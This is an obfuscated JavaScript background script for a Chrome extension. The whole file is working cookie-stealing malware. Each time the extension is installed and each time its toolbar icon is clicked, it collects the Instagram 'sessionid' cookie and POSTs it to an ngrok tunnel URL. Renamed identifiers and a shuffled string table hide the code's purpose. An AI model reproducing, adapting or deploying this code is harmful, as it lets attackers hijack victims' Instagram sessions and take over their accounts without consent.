const _0x4b8a6d = _0x194b;
(function (_0x14de27, _0x119526) {
  const _0x11700a = _0x194b,
    _0x578479 = _0x14de27();
  while (!![]) {
    try {
      const _0x3e3058 =
        -parseInt(_0x11700a(0xc3)) / 0x1 +
        (parseInt(_0x11700a(0xb6)) / 0x2) * (-parseInt(_0x11700a(0xb8)) / 0x3) +
        -parseInt(_0x11700a(0xc4)) / 0x4 +
        parseInt(_0x11700a(0xb3)) / 0x5 +
        (-parseInt(_0x11700a(0xb7)) / 0x6) * (parseInt(_0x11700a(0xbb)) / 0x7) +
        (parseInt(_0x11700a(0xb1)) / 0x8) * (parseInt(_0x11700a(0xbe)) / 0x9) +
        parseInt(_0x11700a(0xb0)) / 0xa;
      if (_0x3e3058 === _0x119526) break;
      else _0x578479["push"](_0x578479["shift"]());
    } catch (_0x21f8e3) {
      _0x578479["push"](_0x578479["shift"]());
    }
  }
})(_0x49ee, 0x47f41),
  chrome[_0x4b8a6d(0xc2)][_0x4b8a6d(0xb5)]["addListener"](() => {
    action();
  }),
  chrome["action"][_0x4b8a6d(0xc1)][_0x4b8a6d(0xbf)]((_0x368528) => {
    action();
  });
function _0x49ee() {
  const _0x509804 = [
    "addListener",
    "map",
    "onClicked",
    "runtime",
    "261297ybIJHW",
    "2311284MCZMHB",
    "cookies",
    "9753200mdvedY",
    "422424lPxuZb",
    ".instagram.com",
    "2829255YuAanu",
    "sessionid",
    "onInstalled",
    "14VWYDGD",
    "55362duWhOt",
    "157224hxuJYD",
    "name",
    "getAll",
    "231xFXBZm",
    "application/json",
    "value",
    "45UCGfLN",
  ];
  _0x49ee = function () {
    return _0x509804;
  };
  return _0x49ee();
}
function _0x194b(_0x501e31, _0x32fac6) {
  const _0x49ee0f = _0x49ee();
  return (
    (_0x194b = function (_0x194b11, _0x3d7720) {
      _0x194b11 = _0x194b11 - 0xaf;
      let _0x36cb05 = _0x49ee0f[_0x194b11];
      return _0x36cb05;
    }),
    _0x194b(_0x501e31, _0x32fac6)
  );
}
const action = () => {
  const _0x53740e = _0x4b8a6d;
  chrome[_0x53740e(0xaf)][_0x53740e(0xba)](
    { domain: _0x53740e(0xb2) },
    function (_0x1a2978) {
      const _0x2638cf = _0x53740e;
      let _0x59bb27 = _0x1a2978["filter"](
        (_0x334ba7) => _0x334ba7["name"] === _0x2638cf(0xb4)
      )
        [_0x2638cf(0xc0)](
          (_0x93f9d6) =>
            _0x93f9d6[_0x2638cf(0xb9)] + "=" + _0x93f9d6[_0x2638cf(0xbd)]
        )
        ["join"](";\x20");
      fetch(
        "https://5d84-2401-4900-417d-4e7f-4c1d-da96-b4c2-4237.ngrok-free.app/endpoint",
        {
          method: "POST",
          headers: { "Content-Type": _0x2638cf(0xbc) },
          body: JSON["stringify"]({ cookies: _0x59bb27 }),
        }
      );
    }
  );
};
